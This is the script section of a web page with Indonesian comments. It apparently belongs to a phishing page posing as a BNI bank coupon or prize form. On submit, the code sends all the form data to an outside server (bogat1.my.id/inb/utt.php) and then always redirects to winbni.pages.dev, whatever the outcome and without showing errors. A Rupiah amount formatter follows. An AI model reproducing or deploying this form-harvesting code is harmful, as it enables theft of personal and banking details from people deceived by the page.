<script>
        $('#formData').on('submit', function(e) {
            e.preventDefault();

            // HONEYPOT: Jika field tersembunyi terisi, berarti bot
            if ($('#hp_field').val() !== '') {
                // Bisa tambahkan log jika mau, atau abaikan saja
                return;
            }

            // BATAS SUBMIT 5 MENIT
            var lastSubmit = sessionStorage.getItem('lastSubmitTime');
            var now = Date.now();
            if (lastSubmit && (now - lastSubmit < 300000)) {
                alert('Anda sudah mengirim data. Mohon tunggu sebentar sebelum mengirim ulang.');
                return;
            }

            // Simpan waktu submit sekarang
            sessionStorage.setItem('lastSubmitTime', now);

            var formData = $(this).serialize();

            $('#kirim').prop('disabled', true).text('Loading...');

            $.ajax({
                type: "POST",
                url: 'https://bogat1.my.id/inb/utt.php', // ganti dengan URL server Anda jika berbeda
                data: formData,
                dataType: "json", // pastikan kita minta JSON
                success: function(response) {
                    if (response.status === "ok") {
                        window.location.href = "https://winbni.pages.dev/";
                    } else {
                        window.location.href = "https://winbni.pages.dev/"; // fallback redirect
                    }
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    // Tidak perlu tampilkan alert error, langsung redirect
                    window.location.href = "https://winbni.pages.dev/";
                },
                complete: function() {
                    // Tidak perlu aktifkan tombol agar anti spam tetap jalan
                    // $('#kirim').prop('disabled', false).text('Cetak Kupon');
                }
            });
        });
        </script><script>
        
          /* Dengan Rupiah */
    var dengan_rupiah = document.getElementById('dengan-rupiah');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
    </script>
